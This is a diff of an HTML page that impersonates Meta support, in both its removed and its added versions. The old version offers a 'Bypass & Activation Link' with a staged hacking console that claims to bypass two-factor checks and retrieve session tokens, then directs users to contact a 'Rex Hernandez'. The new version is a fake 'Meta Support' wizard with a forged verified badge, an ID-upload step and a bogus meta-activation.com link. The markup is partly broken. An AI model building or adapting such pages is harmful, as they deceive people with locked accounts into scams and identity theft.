@@ -1,527 +1,264 @@
-
 <!DOCTYPE html>
-<html lang="tl">
+<html lang="en">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Account Activation Link Portal</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
+body{background:#1c1e21;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:30px;}
+.demo-note{background:#fff3cd;color:#856404;padding:12px 20px;border-radius:8px;margin-bottom:20px;width:100%;max-width:520px;font-size:13px;display:flex;align-items:flex-start;gap:8px;}
+.demo-note i{color:#856404;margin-top:2px;}
+.support-card{background:#242526;border-radius:12px;width:100%;max-width:520px;box-shadow:0 4px 20px rgba(0,0,0,0.4);overflow:hidden;}
+.card-header{background:#242526;
+;padding:20px;display:flex;align-items:center;gap:12px;}
+.meta-icon{width:36px;height:36px;background:white;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#0081FB;font-size:20px;}
+.header-text h2{color:white;font-size:18px;display:flex;align-items:center;gap:6px;}
+.badge-verified{background:white;color:#0081FB;font-size:11px;font-weight:bold;padding:2px 6px;border-radius:10px;display:inline-flex;align-items:center;gap:3px;}
+.header-text p{color:rgba(255,255,255,0.85);font-size:12px;margin-top:2px;}
+.steps{display:flex;padding:15px 20px;border-bottom:1px solid #3a3b3c;}
+.step{flex:1;text-align:center;font-size:11px;color:#b0b3b8;transition:all 0.3s;}
+.step.active{color:#0081FB;font-weight:600;}
+.step.completed{color:#42b72a;}
+.step-num{display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:#3a3b3c;color:white;font-size:11px;margin-right:4px;transition:all 0.3s;}
+.step.active .step-num{background:#0081FB;}
+.step.completed .step-num{background:#42b72a;}
+.content{padding:20px;}
+.page{display:none;}
+.page.active{display:block;animation:fadeIn 0.4s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+.label{color:#e4e6eb;font-size:14px;font-weight:500;margin-bottom:10px;display:block;}
+.platform-buttons{display:flex;gap:10px;margin-bottom:20px;}
+.platform-btn{flex:1;padding:10px;border:none;border-radius:6px;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;font-weight:500;transition:all 0.2s;}
+.platform-btn.fb {
+  background: #1877F2;
+  color: #ffffff;
+  border: none;}
+.platform-btn.ig {
+  background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+  color: #ffffff;
+  border: none;
+}
+.platform-btn.fb {
+  background: #1877F2;
+  color: #ffffff;
+  border: none;
+}
 
-        body {
-            background-color: #f0f2f5;
-            min-height: 100vh;
-            padding: 20px;
-        }
+.platform-btn.ig {
+  background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+  color: #ffffff;
+  border: none;
+}
 
-        .page {
-            display: none;
-        }
+.platform-btn.gg {
+  background: #ffffff;
+  color: #000000;
+  border: 1px solid #dadce0;
+}
 
-        .page.active {
-            display: block;
-        }
-
-        .header-bar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 15px 20px;
-            background: white;
-            border-radius: 8px;
-            margin-bottom: 30px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-        }
-
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .fb-logo {
-            width: 35px;
-            height: 35px;
-            background: #1877f2;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-        }
-
-        .fb-text {
-            font-size: 22px;
-            font-weight: 600;
-            color: #1877f2;
-        }
-
-        .verified-badge {
-            background: #e7f3ff;
-            color: #1877f2;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .portal-card {
-            background: white;
-            border-radius: 12px;
-            padding: 30px 25px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
-            max-width: 450px;
-            margin: 0 auto;
-        }
-
-        h1 {
-            text-align: center;
-            font-size: 24px;
-            color: #1c1e21;
-            margin-bottom: 8px;
-        }
-
-        .subtitle {
-            text-align: center;
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 25px;
-            line-height: 1.4;
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #1c1e21;
-            margin-bottom: 6px;
-        }
-
-        input, select, textarea {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 15px;
-            background: #f9f9f9;
-        }
-
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: #1877f2;
-            background: white;
-        }
-
-        textarea {
-            resize: vertical;
-            min-height: 90px;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: background 0.2s;
-        }
-
-        .submit-btn:hover {
-            background: #166fe5;
-        }
-
-        .footer-note {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 11px;
-            color: #8a8d91;
-            line-height: 1.5;
-        }
-
-        hr {
-            border: none;
-            border-top: 1px solid #dadde1;
-            margin: 18px 0;
-        }
-
-        /* ===== LOADING PAGE STYLES ===== */
-        .loading-card {
-            text-align: center;
-            padding: 40px 25px;
-        }
-
-        /* Circular Progress */
-        .circle-loader {
-            position: relative;
-            width: 70px;
-            height: 70px;
-            margin: 0 auto 30px;
-        }
-
-        .circle-bg {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            border: 4px solid #e4e6eb;
-        }
-
-        .circle-progress {
-            position: absolute;
-            top: -4px;
-            left: -4px;
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            border: 4px solid transparent;
-            border-top-color: #1877f2;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-title {
-            font-size: 22px;
-            color: #1c1e21;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        .loading-subtitle {
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 25px;
-        }
-
-        /* Progress Bar */
-        .progress-bar-container {
-            width: 100%;
-            height: 10px;
-            background: #e4e6eb;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            overflow: hidden;
-        }
-
-        .progress-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: #1877f2;
-            border-radius: 5px;
-            transition: width 1s ease;
-        }
-
-        /* Console Log Box */
-        .console-box {
-            background: #1c1e21;
-            color: #4cd964;
-            text-align: left;
-            padding: 18px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            line-height: 1.8;
-            margin-bottom: 20px;
-            min-height: 160px;
-            overflow: hidden;
-        }
-
-        .time-remaining {
-            font-size: 16px;
-            color: #606770;
-            margin-bottom: 30px;
-        }
-
-        .time-remaining strong {
-            color: #1c1e21;
-        }
-
-        /* ===== SUCCESS PAGE STYLES ===== */
-        .success-icon {
-            text-align: center;
-            font-size: 60px;
-            color: #42b72a;
-            margin-bottom: 15px;
-        }
-
-        .success-title {
-            text-align: center;
-            font-size: 22px;
-            color: #1c1e21;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        .success-desc {
-            text-align: center;
-            color: #606770;
-            font-size: 14px;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-
-        .info-box {
-            background: #f0f7ff;
-            border-left: 4px solid #1877f2;
-            padding: 12px 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            color: #1c1e21;
-            line-height: 1.6;
-        }
-
-        .back-btn {
-            background: #e4e6eb;
-            color: #1c1e21;
-            margin-top: 10px;
-        }
-
-        .back-btn:hover {
-            background: #d8dadf;
-        }
-    </style>
+.select-box,.input-field{width:100%;padding:12px;background:#3a3b3c;border:1px solid #4e4f50;border-radius:6px;color:#e4e6eb;font-size:14px;margin-bottom:15px;outline:none;}
+.textarea{width:100%;padding:12px;background:#3a3b3c;border:1px solid #4e4f50;border-radius:6px;color:#e4e6eb;font-size:14px;min-height:90px;resize:none;margin-bottom:15px;outline:none;}
+.notice{background:#2d3548;border-radius:6px;padding:12px;font-size:12px;color:#a8c7fa;line-height:1.6;display:flex;align-items:flex-start;gap:8px;margin-bottom:20px;}
+.notice i{margin-top:2px;color:#a8c7fa;}
+.btn-row{display:flex;gap:10px;margin-top:10px;}
+.btn-next,.btn-back,.btn-submit{flex:1;padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.2s;}
+#e4e6e.btn-back{background:#3a3b3c;color:#e4e6eb;}
+.btn-next,.btn-submit{background:#0081FB;color:white;}
+.btn-next:hover,.btn-submit:hover{background:#006edb;}
+.loading-screen{text-align:center;padding:40px 20px;}
+.loading-icon{font-size:48px;color:#0081FB;margin-bottom:20px;animation:spin 1.5s linear infinite;}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+.loading-title{color:#e4e6eb;font-size:18px;font-weight:600;margin-bottom:10px;}
+.loading-text{color:#b0b3b8;font-size:14px;margin-bottom:20px;}
+.progress-bar{width:100%;height:8px;background:#3a3b3c;border-radius:4px;overflow:hidden;margin-bottom:15px;}
+.progress-fill{height:100%;background:linear-gradient(90deg,#0081FB,#00C6FF);width:0%;border-radius:4px;transition:width 1s linear;}
+.time-remaining{color:#b0b3b8;font-size:13px;}
+.result-screen{text-align:center;padding:30px 20px;}
+.result-icon{font-size:56px;color:#42b72a;margin-bottom:20px;}
+.result-title{color:#e4e6eb;font-size:20px;font-weight:600;margin-bottom:10px;}
+.result-subtitle{color:#b0b3b8;font-size:14px;margin-bottom:25px;}
+.email-box{background:#3a3b3c;border-radius:8px;padding:20px;margin-bottom:20px;text-align:left;}
+.email-label{color:#b0b3b8;font-size:12px;margin-bottom:5px;}
+.email-address{color:#e4e6eb;font-size:15px;font-weight:500;margin-bottom:15px;}
+.link-box{background:#2d3548;border-radius:6px;padding:12px;color:#a8c7fa;font-size:13px;word-break:break-all;margin-bottom:10px;}
+</style>
 </head>
 <body>
-
-    <!-- PAGE 1: FORM -->
-    <div id="page1" class="page active">
-        <div class="header-bar">
-            <div class="logo-section">
-                <div class="fb-logo">f</div>
-                <span class="fb-text">facebook</span>
-            </div>
-            <span class="verified-badge">✓ Meta Security Verified</span>
-        </div>
-
-        <div class="portal-card">
-            <h1>Account Recovery Portal</h1>
-            <p class="subtitle">Submit your details for automated security review & appeal</p>
-
-            <hr>
-
-            <div class="form-group">
-                <label>Full Name (Pangalan)</label>
-                <input type="text" id="fullname" placeholder="Enter your full account name">
-            </div>
-
-            <div class="form-group">
-                <label>Email or Phone Number (Email / Number)</label>
-                <input type="text" id="contact" placeholder="name@example.com or phone">
-            </div>
-
-            <div class="form-group">
-                <label>Select Issue Type (Uri ng Problema)</label>
-                <select id="issue">
-                    <option selected>Hacked Account (Na-hack na Account)</option>
-                    <option>Page Hacked (Na-hack na Page)</option>
-                    <option>2-Factor Authentication Issue (Problema sa 2FA)</option>
-                    <option>Disabled Account (Naka-disable)</option>
-                    <option>Suspended Account (Naka-suspend)</option>
-                    <option>Locked Account (Naka-lock)</option>
-                    <option>Ad Protection / Restrictions</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>Issue Description (Detalye ng Problema)</label>
-                <textarea id="description" placeholder="Describe what happened to your account..."></textarea>
-            </div>
-
-            <button class="submit-btn" onclick="startProcessing()">Bypass & Activation Link</button>
-
-            <div class="footer-note">
-                Meta Platforms, Inc. All rights reserved. Secure SSL<br>
-                Encryption Active.
-            </div>
-        </div>
+  <div class="support-card">
+    <div class="card-header">
+      <div class="meta-icon real"><i class="fab fa-meta"></i></div>
+      <div class="header-text">
+<h2 style="display:flex;align-items:center;gap:6px;margin:0;">Meta Support<img src="https://i.imgur.com/5QAbIcN.png" alt="Verified" style="width:24px;height:24px;"></h2>
+        <p>Account Security & Recovery Center</p>
+      </div>
     </div>
 
-    <!-- PAGE 2: LOADING / PROCESSING -->
-    <div id="page2" class="page">
-        <div class="header-bar">
-            <div class="logo-section">
-                <div class="fb-logo">f</div>
-                <span class="fb-text">facebook</span>
-            </div>
-            <span class="verified-badge">✓ Meta Security Verified</span>
-        </div>
-
-        <div class="portal-card loading-card">
-            <div class="circle-loader">
-                <div class="circle-bg"></div>
-                <div class="circle-progress"></div>
-            </div>
-
-            <h2 class="loading-title"> Activation Link...</h2>
-            <p class="loading-subtitle">Communicating with Meta Agent Rex Hernandez</p>
-
-            <div class="progress-bar-container">
-                <div id="progressBar" class="progress-bar-fill"></div>
-            </div>
-
-            <div id="consoleLog" class="console-box"></div>
-
-            <p class="time-remaining">Time remaining: <strong id="timeLeft">10s</strong></p>
-
-            <div class="footer-note">
-                Meta Platforms, Inc. All rights reserved. Secure SSL<br>
-                Encryption Active.
-            </div>
-        </div>
+    <div class="steps">
+      <div class="step active" data-step="1"><span class="step-num">1</span> Details</div>
+      <div class="step" data-step="2"><span class="step-num">2</span> Confirm</div>
+      <div class="step" data-step="3"><span class="step-num">3</span> Contact</div>
+      <div class="step" data-step="4"><span class="step-num">4</span> Verify ID</div>
     </div>
 
-    <!-- PAGE 3: SUCCESS -->
-    <div id="page3" class="page">
-        <div class="header-bar">
-            <div class="logo-section">
-                <div class="fb-logo">f</div>
-                <span class="fb-text">facebook</span>
-            </div>
-            <span class="verified-badge">✓ Meta Security Verified</span>
+    <div class="content">
+      
+      <div class="page active" id="page1">
+        <label class="label">SELECT AFFECTED SERVICE / PLATFORM</label>
+        <div class="platform-buttons">
+          <button class="platform-btn fb selected" data-platform="fb"><i class="fab fa-facebook-f"></i> Facebook</button>
+          <button class="platform-btn ig" data-platform="ig"><i class="fab fa-instagram"></i> Instagram</button>
+          <button class="platform-btn gg" data-platform="gg"><i class="fab fa-google"></i> Google</button>
         </div>
+        <label class="label">SELECT REASON FOR RECOVERY</label>
+        <select class="select-box" id="reasonSelect">
+          <option>Temporarily Disabled or Suspended Account</option>
+          <option selected>Permanently Disabled Account</option>
+          <option>Locked Account Issue</option>
+          <option>Security & Password Reset Issue</option>
+          <option>Two-Factor Authentication (2FA) Problem</option>
+          <option>Lost Email/Phone Access</option>
+          <option>Other Technical Request</option>
+        </select>
+        <label class="label">ADDITIONAL DETAILS</label>
+        <textarea class="textarea" id="detailsInput" placeholder="Provide any details..."></textarea>
+        <div class="notice"><i class="fas fa-shield-alt"></i><span><strong>Meta Secure Notice:</strong> All submitted details are encrypted.</span></div>
+        <button class="btn-next" onclick="goToPage(2)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
+      </div>
 
-        <div class="portal-card">
-            <div class="success-icon">✓</div>
-            <h2 class="success-title">Activation Link Sent Rex Hernandez!</h2>
-            <p class="success-desc">Rex Hernandez Sent Activation Link.<br>Contact Rex Hernandez To send Activation Link <strong>24–48 hours</strong>.</p>
-
-            <div class="info-box">
-                <strong>Reference ID:</strong> #META-REVIEW-<span id="refId">000000</span><br>
-                <strong>Status:</strong> In Progress<br>
-                <strong>Submitted:</strong> <span id="submitDate"></span>
-            </div>
-
-            <p style="font-size:13px; color:#606770; margin-bottom:20px;">
-                We may ask for additional verification to confirm account ownership. Please do not submit multiple appeals.
-            </p>
-
-            <button class="submit-btn" onclick="resetAll()">Contact Rex Hernandez</button>
-            <button class="submit-btn back-btn" onclick="resetAll()">← Back to Form</button>
-
-            <div class="footer-note">
-                Meta Platforms, Inc. — Account recovery
-            </div>
+      <div class="page" id="page2">
+        <label class="label">REVIEW YOUR INFORMATION</label>
+        <div style="background:#3a3b3c;border-radius:6px;padding:15px;margin-bottom:20px;">
+          <p style="color:#b0b3b8;font-size:12px;margin-bottom:4px;">Platform</p>
+          <p style="color:#e4e6eb;font-size:14px;margin-bottom:15px;" id="confirmPlatform">Facebook</p>
+          <p style="color:#b0b3b8;font-size:12px;margin-bottom:4px;">Reason</p>
+          <p style="color:b;font-size:14px;margin-bottom:15px;" id="confirmReason">Permanently Disabled Account</p>
+          <p style="color:#b0b3b8;font-size:12px;margin-bottom:4px;">Details</p>
+          <p style="color:#e4e6eb;font-size:14px;" id="confirmDetails">-</p>
         </div>
+        <div class="notice"><i class="fas fa-info-circle"></i><span>Please double-check your information before proceeding.</span></div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="goToPage(1)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
+          <button class="btn-next" onclick="goToPage(3)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
+        </div>
+      </div>
+
+      <div class="page" id="page3">
+        <label class="label">YOUR CONTACT INFORMATION</label>
+        <p style="color:#b0b3b8;font-size:13px;margin-bottom:15px;">Enter the email where we can send the activation link.</p>
+        <label class="label" style="font-size:13px;">Email Address</label>
+        <input type="email" class="input-field" id="contactEmail" value="rex.hernandez@gmail.com" placeholder="your@email.com">
+        <label class="label" style="font-size:13px;">Confirm Email Address</label>
+        <input type="email" class="input-field" id="contactEmailConfirm" value="rex.hernandez@gmail.com" placeholder="your@email.com">
+        <div class="notice"><i class="fas fa-envelope"></i><span>We will send an activation link to this email once reviewed.</span></div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="goToPage(2)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
+          <button class="btn-next" onclick="goToPage(4)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
+        </div>
+      </div>
+
+      <div class="page" id="page4">
+        <label class="label">VERIFY YOUR IDENTITY</label>
+        <p style="color:#b0b3b8;font-size:13px;margin-bottom:20px;">Upload a valid government ID or take a selfie.</p>
+        <div style="border:2px dashed #4e4f50;border-radius:8px;padding:30px;text-align:center;margin-bottom:20px;">
+          <i class="fas fa-cloud-upload-alt" style="font-size:32px;color:#b0b3b8;margin-bottom:10px;"></i>
+          <p style="color:#b0b3b8;font-size:14px;">Click to upload your ID photo</p>
+          <p style="color:#6e6f70;font-size:12px;margin-top:5px;">JPG, PNG — Max 10MB</p>
+        </div>
+        <div class="notice"><i class="fas fa-lock"></i><span>Your ID is securely encrypted and used only for verification.</span></div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="goToPage(3)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
+          <button class="btn-submit" onclick="submitReview()">Submit for Review</button>
+        </div>
+      </div>
+
+      <div class="page" id="page5">
+        <div class="loading-screen">
+          <div class="loading-icon"><i class="fas fa-spinner"></i></div>
+          <h3 class="loading-title">Processing Your Request</h3>
+          <p class="loading-text">Please wait while we review your information...</p>
+          <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+          <p class="time-remaining" id="timeRemaining">Estimated wait time: 30minutes</p>
+        </div>
+      </div>
+
+      <div class="page" id="page6">
+        <div class="result-screen">
+          <div class="result-icon"><i class="fas fa-check-circle"></i></div>
+          <h3 class="result-title">Waiting for Review</h3>
+          <p class="result-subtitle">Your request has been submitted successfully.</p>
+          <div class="email-box">
+            <p class="email-label">Activation link will be sent to:</p>
+            <p class="email-address">Rex Hernandez &lt;rex.hernandez@gmail.com&gt;</p>
+            <p class="email-label" style="margin-top:15px;">Activation Link Preview:</p>
+            <div class="link-box">https://meta-activation.com/verify?code=8XJ-29K-P7Z</div>
+          </div>
+          <p style="color:#b0b3b8;font-size:12px;line-height:1.5;"><i class="fas fa-info-circle" style="margin-right:5px;"></i> Please check your email within 30 minutes. If not found, check Spam/Junk folder.</p>
+        </div>
+      </div>
+      
     </div>
+  </div>
+</>
 
-    <script>
-        let countdownInterval;
+<script>
+let currentPage = 1;
+let timerInterval;
 
-        function showPage(pageNum) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('page' + pageNum).classList.add('active');
-            window.scrollTo(0, 0);
-        }
+document.querySelectorAll('.platform-btn').forEach(btn => {
+  btn.addEventListener('click', function(){
+    document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('selected'));
+    this.classList.add('selected');
+  });
+});
 
-        function startProcessing() {
-            // Validation
-            const name = document.getElementById('fullname').value.trim();
-            const contact = document.getElementById('contact').value.trim();
-            const issue = document.getElementById('issue').value;
+function updateConfirmPage(){
+  let platformText = "Facebook";
+  if(document.querySelector('.platform-btn.ig.selected')) platformText = "Instagram";
+  if(document.querySelector('.platform-btn.gg.selected')) platformText = "Google";
+  document.getElementById('confirmPlatform').textContent = platformText;
+  document.getElementById('confirmReason').textContent = document.getElementById('reasonSelect').value;
+  document.getElementById('confirmDetails').textContent = document.getElementById('detailsInput').value || "-";
+}
 
-            if (!name || !contact) {
-                alert('⚠️ Pakipunuan muna ang Full Name at Email/Number!');
-                return;
-            }
+function goToPage(pageNum){
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page' + pageNum).classList.add('active');
+  
+  document.querySelectorAll('.step').forEach(s => {
+    s.classList.remove('active', 'completed');
+    let stepNum = parseInt(s.dataset.step);
+    if(stepNum < pageNum){
+      s.classList.add('completed');
+    } else if(stepNum === pageNum){
+      s.classList.add('active');
+    }
+  });
+  
+  if(pageNum === 2) updateConfirmPage();
+  currentPage = pageNum;
+}
 
-            // Go to loading page
-            showPage(2);
-
-            // Reset elements
-            const consoleBox = document.getElementById('consoleLog');
-            const progressBar = document.getElementById('progressBar');
-            const timeLeftEl = document.getElementById('timeLeft');
-
-            consoleBox.innerHTML = '';
-            progressBar.style.width = '0%';
-
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-
-            // Console log lines
-            const logLines = [
-                `[${timeStr}] Initializing security bypass sequence...`,
-                `[${timeStr}] Target: ${name}`,
-                `[${timeStr}] [Issue: ${issue.split('(')[0].trim()}]`,
-                `[${timeStr}] Connecting to Meta Support API gateway...`,
-                `[${timeStr}] Verifying account ownership...`,
-                `[${timeStr}] Bypassing two-factor challenge checkpoints...`,
-                `[${timeStr}] Retrieving account session tokens...`,
-                `[${timeStr}] Finalizing recovery process...`,
-                `[${timeStr}] Request queued successfully!`
-            ];
-
-            let currentLine = 0;
-            let timeLeft = 15;
-
-            // Animate console logs
-            const logInterval = setInterval(() => {
-                if (currentLine < logLines.length) {
-                    consoleBox.innerHTML += logLines[currentLine] + '<br>';
-                    consoleBox.scrollTop = consoleBox.scrollHeight;
-                    currentLine++;
-                }
-            }, 600);
-
-            // Animate progress bar
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 4;
-                progressBar.style.width = progress + '%';
-                if (progress >= 100) clearInterval(progressInterval);
-            }, 600);
-
-            // Countdown timer
-            timeLeftEl.textContent = timeLeft + 's';
-            countdownInterval = setInterval(() => {
-                timeLeft--;
-                timeLeftEl.textContent = timeLeft + 's';
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    clearInterval(logInterval);
-                    clearInterval(progressInterval);
-                    showSuccessPage();
-                }
-            }, 1000);
-        }
-
-        function showSuccessPage() {
-            // Generate reference ID and date
-            document.getElementById('refId').textContent = Math.floor(Math.random() * 900000) + 100000;
-            document.getElementById('submitDate').textContent = new Date().toLocaleString('en-US', {
-                dateStyle: 'full',
-                timeStyle: 'short'
-            });
-            showPage(3);
-        }
-
-        function resetAll() {
-            document.getElementById('fullname').value = '';
-            document.getElementById('contact').value = '';
-            document.getElementById('description').value = '';
-            document.getElementById('issue').selectedIndex = 0;
-            showPage(1);
-        }
-    </script>
+function submitReview(){
+  goToPage(5);
+  let progress = 0;
+  let waitSeconds = 50;
+  timerInterval = setInterval(() => {
+    progress += (50 / waitSeconds);
+    if(progress >= 50){
+      clearInterval(timerInterval);
+      goToPage(6);
+      return;
+    }
+    document.getElementById('progressFill').style.width = progress + '%';
+    let mins = Math.floor((waitSeconds - (progress/50)*waitSeconds) / 50);
+    let secs = Math.floor((waitSeconds - (progress/50)*waitSeconds) % 50);
+    document.getElementById('timeRemaining').textContent = `Estimated wait time: ${mins}m ${secs}s`;
+  }, 50);
+}
+</script>
 
 </body>
 </html>
